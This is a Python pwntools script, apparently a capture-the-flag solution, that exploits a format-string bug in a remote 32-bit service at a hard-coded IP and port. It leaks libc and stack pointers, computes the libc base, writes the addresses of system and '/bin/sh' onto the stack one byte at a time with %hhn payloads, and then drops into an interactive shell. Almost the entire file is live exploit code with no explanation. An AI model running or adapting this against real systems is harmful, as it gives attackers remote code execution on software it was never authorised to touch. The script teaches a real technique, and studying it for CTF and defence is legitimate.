from pwn import *
def lv_up(num):
	while(num<0 or num > 255):
		if(num<0):
			num=num+256;
		if(num>255):
			num=num-256;
	return num;
elf=ELF('./libc6_2.23-0ubuntu9_i386.so')
#elf=ELF('/lib/i386-linux-gnu/libc.so.6')
system_off=elf.symbols['system']
#p=process('./4-4')
p=remote('121.42.189.18',10009)
print p.recvline();
print p.recvline();
print p.recvline();
payload='%15$p%6$p'
p.sendline(payload)
data=p.recvuntil('8\n')
im=0xf3
leak_libc=int(data[:10],16)
leak_stack=int(data[10:-1],16)
leakfunc=leak_libc-im
base=leakfunc-elf.symbols['__libc_start_main']
elf.address=base
log.info("leak_stack:%s",hex(leak_stack))
#log.success(hex(leak_libc-elf.symbols['__libc_start_main']))
system=elf.symbols['system']
bash= elf.search('/bin/sh').next()
Off=leak_stack-12;
s1=system&0xff
s2=system&0xff00
s2=s2>>8
s3=system&0xff0000
s3=s3>>16
s4=system&0xff000000
s4=s4>>24
b1=bash&0xff
b2=bash&0xff00
b2=b2>>8
b3=bash&0xff0000
b3=b3>>16
b4=bash&0xff000000
b4=b4>>24
payload="%c%c%c%c%8c%hhn%{}c%10$hhnzzz".format(lv_up(s1-12))
p.sendline(payload)
p.recvuntil('zzz\n')
payload="%c%c%c%c%9c%hhn%{}c%10$hhnzzz".format(lv_up(s2-13))
p.sendline(payload)
p.recvuntil('zzz\n')
payload="%c%c%c%c%10c%hhn%{}c%10$hhnzzz".format(lv_up(s3-14))
p.sendline(payload)
log.info("AAAA%s",p.recv())
payload="%c%c%c%c%11c%hhn%{}c%10$hhnzzz".format(lv_up(s4-15))
p.sendline(payload)
p.recv()
payload="%c%c%c%c%16c%hhn%{}c%10$hhnzzz".format(lv_up(b1-20))
p.sendline(payload)
p.recv()
payload="%c%c%c%c%17c%hhn%{}c%10$hhnzzz".format(lv_up(b2-21))
p.sendline(payload)
p.recv()
payload="%c%c%c%c%18c%hhn%{}c%10$hhnzzz".format(lv_up(b3-22))
p.sendline(payload)
p.recv()
payload="%c%c%c%c%19c%hhn%{}c%10$hhnzzz".format(lv_up(b4-23))
p.sendline(payload)
log.info("BBBB%s",p.recv())
p.sendline("quit");
p.interactive();
#num==7



